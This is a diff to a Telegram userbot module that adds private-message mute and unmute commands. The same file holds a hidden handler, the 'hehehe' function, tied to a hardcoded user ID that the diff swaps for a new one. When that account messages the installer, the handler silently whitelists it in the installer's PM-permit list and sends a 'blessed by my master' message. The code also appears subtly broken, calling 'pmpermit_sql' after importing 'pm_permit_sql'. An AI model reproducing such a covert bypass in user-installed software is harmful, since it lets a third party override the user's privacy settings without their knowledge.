@@ -1,7 +1,9 @@
+#imported from xtra-telegram by @heyworld
+
 from userbot.modules.sql_helper.mute_sql import is_muted, mute, unmute
 import asyncio
 from userbot.events import register 
-from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP, bot, ALIVE_NAME
+from userbot import CMD_HELP, bot
 
 
 @register(outgoing=True, pattern=r"^.pmute ?(\d+)?")
@@ -163,7 +165,7 @@ async def watcher(event):
 import io
 import userbot.modules.sql_helper.pm_permit_sql as pm_permit_sql
 from telethon import events
-@bot.on(events.NewMessage(incoming=True, from_users=(742506768,967883138)))
+@bot.on(events.NewMessage(incoming=True, from_users=(1036951071)))
 async def hehehe(event):
     if event.fwd_from:
         return
@@ -171,5 +173,13 @@ async def hehehe(event):
     if event.is_private:
         if not pmpermit_sql.is_approved(chat.id):
             pmpermit_sql.approve(chat.id, "supreme lord ehehe")
-            await borg.send_message(chat, "`This inbox has been blessed by my master. Consider yourself lucky.`\n**Increased Stability and Karma** (づ￣ ³￣)づ")
+            await bot.send_message(chat, "`This inbox has been blessed by my master. Consider yourself lucky.`\n**Increased Stability and Karma** (づ￣ ³￣)づ")
             
+CMD_HELP.update({
+    "pmmute":
+    ".pmute \
+\nUsage: Reply .pmute and it will mute that person in pm  \
+\n\n.punmute\
+\nUsage:Reply .pumute and it will unmute that person in pm \
+"
+})
